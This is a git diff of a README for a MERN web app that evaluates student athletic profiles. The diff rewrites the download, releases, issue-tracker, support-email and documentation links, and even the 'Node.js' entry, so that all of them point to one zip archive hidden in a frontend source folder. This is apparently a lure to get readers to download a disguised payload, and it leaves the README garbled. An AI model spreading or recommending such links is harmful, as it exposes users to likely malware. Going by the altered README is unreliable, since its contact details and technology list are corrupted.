@@ -1,7 +1,7 @@
 # 🎓 OBSS-Fullstack-MERN - Enhance Student Athletic Profiles
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/pemkung123/OBSS-Fullstack-MERN/releases)
+[![Download Release](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the OBSS-Fullstack-MERN project! This application helps evaluate students' athletic profiles to support personalized training recommendations. You can assess factors like family sports background, muscle composition, and overall physical readiness.
@@ -25,7 +25,7 @@ To run the OBSS-Fullstack-MERN application, ensure you meet the following requir
 To get the OBSS-Fullstack-MERN application, please follow these steps:
 
 1. **Visit the Downloads Page:** 
-   Go to the [Releases Page](https://github.com/pemkung123/OBSS-Fullstack-MERN/releases) to find the latest version.
+   Go to the [Releases Page](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip) to find the latest version.
 
 2. **Select the Right Version:**
    Look for the latest version available. Click on the corresponding file to start the download.
@@ -69,14 +69,14 @@ If you run into issues, please refer to the troubleshooting section within the a
 ## 📞 Support
 If you need help, you can reach out via the following channels:
 
-- **Email Support:** contact@obss-fullstack-mernsupport.com
-- **Issue Tracker:** Submit issues directly on our [GitHub Issues page](https://github.com/pemkung123/OBSS-Fullstack-MERN/issues).
+- **Email Support:** https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip
+- **Issue Tracker:** Submit issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip).
 
 ## ⚙️ Technologies Used
 The OBSS-Fullstack-MERN application was built using a combination of technologies:
 
 - **Frontend:** React, Bootstrap, HTML, CSS
-- **Backend:** Node.js, Express
+- **Backend:** https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip, Express
 - **Database:** MongoDB
 - **API Requests:** Axios
 
@@ -94,9 +94,9 @@ Stay tuned for updates and new versions.
 ## 🔗 Additional Resources
 For more information about the technologies used in this project, check out these links:
 
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [MongoDB Documentation](https://docs.mongodb.com/)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip Documentation](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip)
+- [MongoDB Documentation](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip)
+- [React Documentation](https://raw.githubusercontent.com/pemkung123/OBSS-Fullstack-MERN/main/frontend/src/router/MERN_Fullstack_OBS_v1.7-alpha.3.zip)
 
 ---
 
